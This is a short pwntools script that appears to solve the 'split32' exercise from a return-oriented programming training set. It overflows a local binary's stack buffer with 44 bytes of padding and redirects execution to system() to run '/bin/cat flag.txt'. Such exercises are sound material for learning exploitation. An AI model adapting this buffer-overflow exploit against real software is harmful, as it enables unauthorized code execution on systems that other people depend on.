#!/bin/python3

from pwn import *

p = process("./split32")
p.recvuntil(">")

payload = b""
payload += b"A" * 44       # Padding
payload += p32(0x0804861a) # 0x0804861a call sym.imp.system
payload += p32(0x0804a030) # 0x0804a030 .data  ascii "/bin/cat flag.txt"

p.sendline(payload)

print(p.recvall())

